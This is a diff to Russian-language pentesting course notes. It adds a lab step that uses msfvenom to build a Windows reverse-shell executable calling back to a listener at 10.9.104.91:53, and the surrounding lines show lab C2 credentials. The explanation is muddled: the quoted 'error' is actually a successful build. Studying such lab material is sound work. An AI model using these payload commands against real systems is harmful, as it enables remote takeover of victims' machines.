@@ -362,6 +362,26 @@ docker-compose -f ~/docker-compose.yml down
 username: empireadmin  
 password: password123
 
+## Модуль 31. Практическая работа 31.6
+
+Если при попытке сгенерировать файл реверс шелла возникает такая ошибка:
+
+```
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.104.91 LPORT=53 -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse.exe
+```
+
+Это происходит, из-за отсутствия arm исходников и для работы надо дополнительно указать нуждую x64 архитектуру:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp --platform win -a x64 LHOST=10.9.104.91 LPORT=53 -f exe -o reverse.exe
+```
+
 ## Взлом Wi-Fi. 34 модуль
 
 Купил карту [ALFA Network AWUS036ACM](https://market.yandex.ru/product--alfa-network-awus036acm/1881542156?sku=102062826659&cpa=1) с чипсетом MT7612U. Брал за 7100. На момент написания в ямаркете ее нет (пишу это в конце октября, покупал в конце августа), но в других местах есть. 
